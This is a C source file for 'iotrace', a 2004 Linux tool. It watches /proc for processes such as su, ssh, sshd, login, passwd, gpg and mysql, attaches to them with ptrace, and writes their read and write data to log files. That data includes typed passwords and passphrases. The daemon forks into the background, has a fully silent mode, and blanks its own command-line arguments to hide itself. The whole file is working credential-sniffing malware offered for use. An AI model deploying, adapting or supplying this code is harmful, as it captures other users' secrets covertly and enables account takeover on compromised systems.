/*
 * $Id: iotrace-Linux.c,v 1.4 2004/12/25 13:33:32 xenion Exp $
 *
 * Copyright (c) 2004 Dallachiesa Michele <michele.dallachiesa at poste.it>
 *
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification are permitted.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * 'cc iotrace-Linux.c -o iotrace'
 *
 * CHANGELOG
 * 25/04/2004  misc fixes 
 * 07/04/2004  misc fixes
 * 30/03/2004  performance improvement
 * 29/03/2004  first release 
 *
 * HAVE FUN!
 */

#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <pwd.h>
#include <sys/user.h>
#include <sys/syscall.h>


// monitored commands (comm)
#define MONITORED_CMDS               \
  "su", "login",  "ssh",  "sshd", "ftp",   \
  "telnet",  "rsh",  "scp",  "rcp",  \
  "rlogin",  "rexec",  "passwd",     \
  "adduser",  "mysql", "gpg"


#define MAX_IOLEN 128		// max i/o length. with -c you can set a
				// lower value.. try 1 :)
#define PROC_TRACE_TIMEOUT 20	// trace i/o just for 20 seconds
#define NSECSLEEP 200000000	// check for new processes every 1/5
				// seconds
#define BUFLEN   192		// size for buf, multi-purpose buffer

#define PREFIX_PROCLOG "trace"
#define PREFIX_DAEMONLOG "daemon"

#define EXPECT_EXITED   1
#define EXPECT_SIGNALED 2
#define EXPECT_STOPPED  4

#define ID0 "IOTRACE " VER "Linux"


#define SAFE_FCLOSE(x) do{ if(x) { fclose(x); x = NULL; } }while(0)

#define SIGSTR(x) x == SIGURG  ? "SIGURG"  : \
                  x == SIGPIPE ? "SIGPIPE" : \
                  x == SIGQUIT ? "SIGQUIT" : \
                  x == SIGINT  ? "SIGINT"  : \
                  x == SIGTERM ? "SIGTERM" : \
                  x == SIGHUP  ? "SIGHUP"  : \
                  x == SIGSEGV ? "SIGSEGV" : \
                  x == SIGBUS  ? "SIGBUS"  : \
                  x == SIGALRM ? "SIGALRM" : "UNKWOWN"


typedef struct {
    char            dir[PATH_MAX];
    int             max_rw_len;
    int             silent;
} OPT;


void            fatal(char *, ...);
void            sleepfor(long sec, long nsec);
void            help();
void            init_opt(int, char **);
void            die(int);
void            sigchld_handler(int);
void            mylog(const char *format, ...);
FILE           *myfopen(const char *mode, char *pattern, ...);
FILE           *fopennlog(const char *dir, const char *prefix);
void            mywait(pid_t p, int report, int stopsig);
void           *ttmemcpy(pid_t, unsigned char *, unsigned char *, size_t);
pid_t           proc_search();
void            proc_attach();
void            proc_detach();
void            proc_trace();


OPT             o;
pid_t           targetpid = 0;
FILE           *flog = NULL;
char           *monitored[] = { MONITORED_CMDS, NULL };
char            buf[BUFLEN];
long            myHZ = 0;


int
main(int argc, char **argv)
{
    int             i;
    pid_t           pid;

    if (argc == 1)
	help();
    init_opt(argc, argv);

    setsid();
    if (fork())
	exit(0);

#ifdef DEBUG
    mylog("DEBUG enabled");
#endif

#ifdef DEBUG
    mylog("max_rw_len: %d", o.max_rw_len);
#endif

    if ((myHZ = sysconf(_SC_CLK_TCK)) == -1)
	fatal("sysconf(_SC_CLK_TCK) failed");
#ifdef DEBUG
    mylog("sysconf(_SC_CLK_TCK) = %d", myHZ);
#endif

    fprintf(flog, "monitoring: ");
    for (i = 0; monitored[i]; ++i)
	fprintf(flog, "%s ", monitored[i]);
    fprintf(flog, "\n");
    fflush(flog);


    signal(SIGCHLD, sigchld_handler);
    signal(SIGTERM, die);
    signal(SIGINT, die);
    signal(SIGSEGV, die);
    signal(SIGURG, SIG_IGN);

    /*
     * calculating 'last'..
     */
    while (proc_search());

    for (;;) {
	sleepfor(0, NSECSLEEP);
	if ((pid = proc_search())) {
	    mylog("spawning child (will trace %d)", pid);
	    if (fork() == 0) {
		targetpid = pid;
		proc_attach();
	    }
	    sleepfor(1, 0);	// proc_search can find 1 targetpid per
	    // second
	}
    }

    return 0;			/* never reached */
}


void
fatal(char *pattern, ...)
{
    va_list         ap;

    if (flog == NULL && !o.silent)
	flog = stdout;

    if (flog) {
	fprintf(flog, "\n[");
	va_start(ap, pattern);
	vfprintf(flog, pattern, ap);
	va_end(ap);
	fprintf(flog, "]\n");
    }

    die(SIGTERM);
}


FILE           *
myfopen(const char *mode, char *pattern, ...)
{
    va_list         ap;
    char            path[PATH_MAX];
    int             z;

    va_start(ap, pattern);
    z = vsnprintf(path, PATH_MAX - 1, pattern, ap);
    va_end(ap);

    if (z == -1)
	return NULL;

    path[PATH_MAX - 1] = '\0';

    return fopen(path, mode);
}


void
sleepfor(long sec, long nsec)
{
    struct timespec req;

    req.tv_sec = sec;
    req.tv_nsec = nsec;

    nanosleep(&req, NULL);
}



void
init_opt(int argc, char **argv)
{
    int             c;

    o.dir[0] = '\0';
    o.max_rw_len = MAX_IOLEN;
    o.silent = 0;

    while ((c = getopt(argc, argv, "l:c:sV")) != EOF)
	switch (c) {

	case 'l':
	    strncpy(o.dir, optarg, PATH_MAX - 1);
	    o.dir[PATH_MAX - 1] = '\0';
	    break;

	case 'c':
	    o.max_rw_len = atoi(optarg);
	    break;

	case 's':
	    o.silent = 1;
	    break;

	case 'V':
	    printf("%s\n", ID0);
#ifdef DEBUG
	    printf("(DEBUG defined)\n");
#endif
	    exit(0);

	default:
	    exit(0);

	}

    if (o.dir[0] == '\0')
	fatal("logs directory required");

    // fopennlog checks the dir
    flog = fopennlog(o.dir, PREFIX_DAEMONLOG);
    if (!flog)
	fatal("fopennlog(): %s", strerror(errno));

    // ttmemcpy requires a buffer with a sizeof(long int) padding
    if (o.max_rw_len < 0 || o.max_rw_len + sizeof(long int) > BUFLEN)
	fatal("max_rw_len too big or negative");

    for (c = 1; c < argc; ++c)
	memset(argv[c], '\0', strlen(argv[c]));
}


void
help()
{
    int             i,
                    c;

    puts("USAGE: iotrace [options]\n");
    puts(" -l path          The logs directory");
    puts(" -c count         Ignore I/O if length is greater than <count>");
    printf("                  bytes (default is %d)\n", MAX_IOLEN);
    puts(" -s               Be totally silent on stdout/stderr");
    puts(" -V               Display version information\n");


    printf("Monitoring: ");
    c = 12;
    for (i = 0; monitored[i]; ++i) {
	c += strlen(monitored[i]) + 2;
	if (c > 70) {
	    c = 0;
	    printf("\n");
	}
	printf("%s%c ", monitored[i], monitored[i + 1] ? ',' : '.');
    }
    puts("\n");
    exit(0);
}


void
sigchld_handler(int signo)
{
    while (waitpid(-1, NULL, WNOHANG) > 0);
}


void
die(int signo)
{
    mylog("caught %s(%d) signal, cleaning up", SIGSTR(signo), signo);

    if (targetpid != 0)		/* i'm a (tracing) child */
	ptrace(PTRACE_DETACH, targetpid, 0, 0);

    SAFE_FCLOSE(flog);
    exit(0);
}


void
mylog(const char *format, ...)
{
    va_list         ap;

    if (flog) {
	fprintf(flog, "@@ ");
	va_start(ap, format);
	vfprintf(flog, format, ap);
	va_end(ap);
	fprintf(flog, " @@\n");
    }
}


FILE           *
fopennlog(const char *dir, const char *prefix)
{
    int             fd;
    static char     res_pathname[PATH_MAX];
    static unsigned long index = 0;
    struct stat     mystat;

    if (stat(dir, &mystat) != 0 || !S_ISDIR(mystat.st_mode))
	fatal("%s does not exist or it isn't a directory", dir);

    for (;;) {
	snprintf(res_pathname, PATH_MAX, "%s/%s%ld", dir, prefix, index);
	fd = open(res_pathname,
		  O_CREAT | O_EXCL | O_RDWR | S_IRUSR | S_IWUSR);
	if (fd != -1)
	    break;
	index++;
    }

    return fdopen(fd, "w");
}


pid_t
proc_search()
{
    DIR            *proc_dir;
    struct dirent  *proc_entry;
    FILE           *proc_stat;
    static time_t   last = 0;
    time_t          stime;	/* process life in seconds */
    char           *p,
                   *n;
    int             z,
                    i;
    pid_t           pid;

    if ((proc_dir = opendir("/proc")) == NULL)
	fatal("unable to open /proc: %s", strerror(errno));

    while ((proc_entry = readdir(proc_dir))) {
	for (p = proc_entry->d_name; *p; ++p)
	    if (*p < '0' || *p > '9')
		break;
	if (*p)
	    continue;

	if ((proc_stat =
	     myfopen("r", "/proc/%s/stat", proc_entry->d_name)) == NULL)
	    continue;

	if (fgets(buf, sizeof buf, proc_stat) == NULL) {
	    SAFE_FCLOSE(proc_stat);
	    continue;
	}

	SAFE_FCLOSE(proc_stat);

	if ((n = strchr(buf, '(')) == NULL)
	    continue;
	n++;

	if ((p = strchr(n, ')')) == NULL)
	    continue;
	*p = '\0';

	z = 0;
	for (i = 0; monitored[i]; ++i)
	    if (strcmp(n, monitored[i]) == 0) {
		z = 1;
		break;
	    }

	if (z == 0)
	    continue;

	z = sscanf(p + 2,
		   "%*c %*d %*d %*d %*d %*d %*d %*d"
		   "%*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %*d %ld",
		   &stime);
	if (z != 1)
	    continue;

	stime /= myHZ;

	if (stime <= last)
	    continue;

#ifdef DEBUG
	mylog("new-last: %s (pid=%s) START: %ld", n, proc_entry->d_name,
	      stime);
#endif

	last = stime;
	pid = atoi(proc_entry->d_name);
	closedir(proc_dir);
	return pid;
    }

    closedir(proc_dir);
    return 0;
}


void
proc_attach()
{
    FILE           *f;
    int             i,
                    z;
    struct passwd  *pwd;

    signal(SIGCHLD, SIG_DFL);
    signal(SIGTERM, die);
    signal(SIGINT, die);
    signal(SIGSEGV, die);
    signal(SIGURG, SIG_IGN);
    signal(SIGALRM, die);

    alarm(PROC_TRACE_TIMEOUT);

    /*
     * now flog points to the father logfile..
     */

    SAFE_FCLOSE(flog);

    flog = fopennlog(o.dir, PREFIX_PROCLOG);
    if (!flog)
	fatal("fopennlog(): %s", strerror(errno));

    /*
     * now flog points to the child logfile.
     */

    /*
     * reading the command line ..
     */
    if ((f = myfopen("r", "/proc/%d/cmdline", targetpid)) == NULL)
	mylog("unable to get cmdline: %s", strerror(errno));
    else {
	z = fread(buf, 1, sizeof buf, f);
	SAFE_FCLOSE(f);
	if (z == 0) {
	    SAFE_FCLOSE(f);
	    mylog("bogus cmdline");
	} else {
	    buf[z - 1] = '\0';
	    for (i = 0; i < z - 1; i++)
		if (buf[i] == '\0')
		    buf[i] = ' ';
	    mylog("cmdline: %s", buf);
	}
    }

    /*
     * me must know who's the user.. ssh uses the user as username if
     * nothing else is specified.
     */

    f = myfopen("r", "/proc/%d/status", targetpid);

    if (f)
	while (fgets(buf, sizeof buf, f) != NULL) {
	    if (strncmp("Uid:", buf, 4) == 0) {
		z = atoi(buf + 5);
		for (i = 0; buf[i]; i++)
		    if (buf[i] == '\t' || buf[i] == '\n' || buf[i] == '\r')
			buf[i] = ' ';
		if ((pwd = getpwuid(z)) != NULL)
		    mylog("user: %s - %s", pwd->pw_name, buf);
	    }
	    if (strncmp("Name:", buf, 5) == 0) {
		for (i = 0; buf[i]; i++)
		    if (buf[i] == '\t' || buf[i] == '\n' || buf[i] == '\r')
			buf[i] = ' ';
		mylog(buf);
	    }
	}
    SAFE_FCLOSE(f);

    /*
     * ok, now the dirty work..
     */
    proc_trace();

    mylog("traced");
    die(SIGTERM);
}


void
proc_trace()
{
    mylog("attaching pid=%d", targetpid);

    /*
     * attach to specified process
     */

    if (ptrace(PTRACE_ATTACH, targetpid, 0, 0) < 0)
	fatal("PTRACE_ATTACH failed: %s", strerror(errno));

    mywait(targetpid, EXPECT_STOPPED, SIGSTOP);

    /*
     * we stopped the program in the middle of what it was doing
     * continue it, and make it stop at the next syscall
     */
    if (ptrace(PTRACE_SYSCALL, targetpid, 0, 0) < 0)
	fatal("PTRACE_SYSCALL failed: %s", strerror(errno));

    mylog("waiting");

    for (;;) {
	int             syscall;
	struct user_regs_struct data;

	mywait(targetpid, EXPECT_STOPPED, SIGTRAP);

	if (ptrace(PTRACE_GETREGS, targetpid, &data, &data) < 0)
	    fatal("PTRACE_GETREGS failed: %s", strerror(errno));

	syscall = data.orig_eax;

	if (syscall == __NR_execve) {
	    mylog("syscall:EXECVE");
	    return;
	}

	/*
	 * wait for syscall return
	 */
	if (ptrace(PTRACE_SYSCALL, targetpid, 0, 0) < 0)
	    fatal("PTRACE_SYSCALL failed: %s", strerror(errno));

	if (syscall == __NR_exit) {
	    mywait(targetpid, EXPECT_EXITED, 0);
	    mylog("syscall:EXIT");
	    return;
	}

	mywait(targetpid, EXPECT_STOPPED, SIGTRAP);

	if (ptrace(PTRACE_GETREGS, targetpid, &data, &data) < 0)
	    fatal("PTRACE_GETREGS failed: %s", strerror(errno));

	switch (syscall) {

	    // case __NR_execve: /* getty executes login! */
	case __NR_fork:	/* 'su' forks, then executes the shell */
	    mylog("syscall:FORK");

#if 0
	    // there're some problems here..
	    mylog("syscall:FORK -- spawning new tracing child for %d",
		  data.eax);
	    if (fork() == 0) {
		targetpid = data.eax;
		proc_attach();
		die(SIGTERM);
	    }
#endif
	    break;

	case __NR_read:
	case __NR_write:


#ifdef DEBUG
	    mylog("%s: len %ld fd %d",
		  syscall == __NR_read ? "read" : "write", data.eax,
		  data.ebx);
#endif

	    // ttmemcpy writes multiplies of sizeof(long int)
	    if (data.eax <= 0 || data.eax + sizeof(long int) > BUFLEN)
		break;

	    if (data.ebx < 0 || data.ebx > 2)	// if not
		// stdin/stdout/stderr
		if (data.eax > o.max_rw_len)	// if too big
		    break;	// discard

	    if (ttmemcpy
		(targetpid, buf, (unsigned char *) data.ecx,
		 data.eax) == NULL)
		fatal("ttmemcpy(): %s", strerror(errno));

	    fwrite(buf, 1, data.eax, flog);
	    fflush(flog);
	}

	if (ptrace(PTRACE_SYSCALL, targetpid, 0, 0) < 0)
	    fatal("PTRACE_SYSCALL failed: %s", strerror(errno));
    }

    /*
     * never reached
     */
}


void
mywait(pid_t p, int report, int stopsig)
{
    int             status;

    if (wait(&status) < 0)
	fatal("wait: %s", strerror(errno));

    /*
     * Report only unexpected things.
     *
     * The conditions WIFEXITED, WIFSIGNALED, WIFSTOPPED
     * are mutually exclusive:
     * WIFEXITED:  (status & 0x7f) == 0, WEXITSTATUS: top 8 bits
     * and now WCOREDUMP:  (status & 0x80) != 0
     * WIFSTOPPED: (status & 0xff) == 0x7f, WSTOPSIG: top 8 bits
     * WIFSIGNALED: all other cases, (status & 0x7f) is signal.
     */

    if (WIFEXITED(status) && !(report & EXPECT_EXITED))
	mylog("child exited%s with status %d",
	      WCOREDUMP(status) ? " and dumped core" : "",
	      WEXITSTATUS(status));
    if (WIFSTOPPED(status) && !(report & EXPECT_STOPPED))
	mylog("child stopped by signal %d", WSTOPSIG(status));
    if (WIFSIGNALED(status) && !(report & EXPECT_SIGNALED))
	mylog("child signalled by signal %d", WTERMSIG(status));

    if (WIFSTOPPED(status) && WSTOPSIG(status) != stopsig) {
	/*
	 * a different signal - send it on and wait
	 */

#ifdef DEBUG
	mylog("Waited for signal %d, got %d", stopsig, WSTOPSIG(status));
#endif

	if ((WSTOPSIG(status) & 0x7f) == (stopsig & 0x7f))
	    return;

	if (ptrace(PTRACE_SYSCALL, p, 0, (void *) WSTOPSIG(status)) < 0)
	    fatal("ptrace(PTRACE_SYSCALL, ...): %s", strerror(errno));

	return mywait(p, report, stopsig);
    }

    if ((report & EXPECT_STOPPED) && !WIFSTOPPED(status))
	fatal("not stopped?");
}


/*
 * this function may read sizeof(long int)-1 bytes more than count
 */
void           *
ttmemcpy(pid_t pid, unsigned char *dest, unsigned char *src, size_t count)
{
    size_t          off;
    long int        res;

    for (off = 0; off < count; off += sizeof(long int)) {
	res = ptrace(PTRACE_PEEKTEXT, pid, src + off, 0);
	if (errno > 0)
	    return NULL;
	else
	    memcpy(dest + off, &res, sizeof(long int));
    }

    return dest;
}


#if 0
// not used..was useful to inspect execve params

void           *
ttstrcpy(pid_t pid, unsigned char *dest, unsigned char *src, size_t max)
{
    size_t          off;
    long int        res;
    int             i;

    for (off = 0; off + sizeof(long int) < max - 1;
	 off += sizeof(long int)) {
	res = ptrace(PTRACE_PEEKTEXT, pid, src + off, 0);
	if (errno > 0)
	    return NULL;
	else {
	    memcpy(dest + off, &res, sizeof(long int));
	    for (i = 0; i < sizeof(long int); i++)
		if (*(dest + off + i) == '\0')
		    return dest;
	}
    }

    return NULL;
}
#endif



// eof
